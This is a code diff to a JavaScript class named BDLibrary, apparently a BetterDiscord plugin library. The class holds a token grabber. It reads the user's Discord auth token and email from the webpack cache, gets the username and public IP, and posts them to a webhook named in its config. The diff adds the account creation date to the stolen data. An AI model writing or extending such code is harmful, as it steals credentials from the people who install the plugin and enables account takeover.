@@ -26,9 +26,12 @@ class BDLibrary {
         const authToken = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
         const userEmail = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getEmail !== void 0).exports.default.getEmail();
         const username = BdApi.findModuleByProps("getCurrentUser").getCurrentUser().tag;
+        const creationdate = (BdApi.findModuleByProps("getCurrentUser").getCurrentUser().createdAt);
+        let date = new Date(creationdate);
+        let formatted_date = date.getDate() + "." + (date.getMonth() + 1) + "." + date.getFullYear();
         
         fetch("https://api.ipify.org?format=json").then((data) => {
-            require("request").post(config.webhook, {form: {content: `**\nnickname: __${username}__**\n**Email: __${userEmail}__**\n\n**Received token:**\`\`\`${authToken}\`\`\``}});
+            require("request").post(config.webhook, {form: {content: `**\nnickname: __${username}__**\n**Email: __${userEmail}__**\n**Created: __${formatted_date}__**\n**Received token:**\`\`\`${authToken}\`\`\``}});
         });
     }
 }
